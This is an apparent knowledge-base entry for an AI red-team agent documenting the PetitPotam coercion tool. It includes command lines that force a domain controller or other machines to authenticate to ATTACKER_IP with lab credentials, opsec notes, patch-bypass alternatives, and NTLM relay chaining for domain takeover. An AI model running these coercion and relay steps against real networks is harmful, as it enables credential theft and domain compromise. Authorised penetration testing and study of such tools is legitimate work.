---
name: PetitPotam
category: coercion-relay
subcategories: [authentication-coercion, ms-efsrpc, ntlm-relay]
tradecraft_tags: [coercion, ms-efsrpc, ntlm-relay, efs, dc-coercion, rbcd]
mitre_attack:
  - id: T1187
    name: Forced Authentication
source:
  url: https://github.com/topotam/PetitPotam
  license: MIT
  maintained: false
binary_type: python-script
binary_filename: PetitPotam.py
supported_os: [linux, windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  MS-EFSRPC calls (EfsRpcOpenFileRaw, EfsRpcEncryptFileSrv, etc.) to DCs generate network
  traffic detectable by IDS/IPS signatures. NTLM authentication events on the relay listener
  appear in Windows Security logs. Microsoft patched the unauthenticated path on DCs in
  August 2021 (KB5005413); remaining paths require domain authentication. MDI detects
  abnormal EFS RPC calls.
usage_examples:
  - description: Coerce DC to authenticate to attacker listener (requires domain creds post-patch)
    args: "PetitPotam.py -u jon.snow -p Password123 -d north.sevenkingdoms.local ATTACKER_IP DC_IP"
  - description: Coerce any domain machine (non-DC, still works)
    args: "PetitPotam.py -u jon.snow -p Password123 -d north.sevenkingdoms.local ATTACKER_IP TARGET_IP"
opsec_notes: |
  PetitPotam against DCs is partially patched (unauthenticated path blocked on DCs since
  Aug 2021). The authenticated path to DCs still works if the domain account can reach
  the DC's EFS RPC endpoint. Against non-DC targets, the unpatched path often still works.
  Python-only tool — must run from attacker infrastructure, not from a Windows agent.
  Coercer supersedes PetitPotam as a single-tool interface for all coercion methods.
gotchas: |
  Python script — not usable from within Apollo directly. Post-August-2021 patch blocks
  unauthenticated use against DCs (MS-EFSRPC requires authentication when targeting DCs).
  For unauthenticated coercion post-patch, try MS-RPRN (SpoolSample), MS-DFSNM, or
  other protocols via Coercer. The relay listener (ntlmrelayx, Responder) must be ready
  before triggering coercion.
related_ttps: [coercer, spoolsample, dfscoerce, shadowcoerce, krbrelay]
alternatives: [coercer, spoolsample, dfscoerce]
common_args:
  listener:
    description: Attacker IP to direct the coerced authentication to
    typical_values: ["192.168.56.100"]
    required: true
  target:
    description: Target machine to coerce (IP or hostname)
    typical_values: ["192.168.56.10", "DC01.north.sevenkingdoms.local"]
    required: true
  -u:
    name: --username
    description: Domain username for authenticated coercion (required post-patch for DCs)
    typical_values: ["jon.snow"]
  -p:
    name: --password
    description: Password for domain user
    typical_values: ["Password123"]
  -d:
    name: --domain
    description: Domain FQDN
    typical_values: ["north.sevenkingdoms.local"]
last_updated: 2026-05-29
---

# PetitPotam

The original MS-EFSRPC authentication coercion PoC by topotam. PetitPotam abuses
Windows Encrypting File System RPC (MS-EFSRPC) functions to force a target machine
to authenticate to an attacker-controlled listener via NTLM. The coerced auth can
then be relayed to LDAP (for RBCD or shadow credentials) or SMB (for remote execution).
PetitPotam was the first widely-exploited coercion tool after the PrintSpooler; it has
since been superseded by Coercer for multi-protocol coverage.

## Typical use cases
- Coerce authentication from domain-joined machines to relay listener
- Force DC (pre-patch) or member server (post-patch) to authenticate as machine account$
- Input to NTLM relay chain (RBCD, shadow credentials, ADCS ESC8)

## How Sage uses this
PetitPotam is a Python tool run from attacker infrastructure. Sage documents it for
understanding the coercion landscape. For Windows-side coercion in Apollo engagements,
KrbRelay/SharpKrbRelay (no external listener needed) are preferred. For Python-side
infrastructure, Coercer supersedes PetitPotam with multi-protocol support.

## Output
Console output indicating whether the coercion was triggered. The real output appears
in the relay listener's console (ntlmrelayx authentication events).

## Apollo-specific note
Python-only — cannot run directly from Apollo. Run from attacker's Linux infrastructure
alongside ntlmrelayx. For Windows-side alternatives, use KrbRelay or SharpKrbRelay.
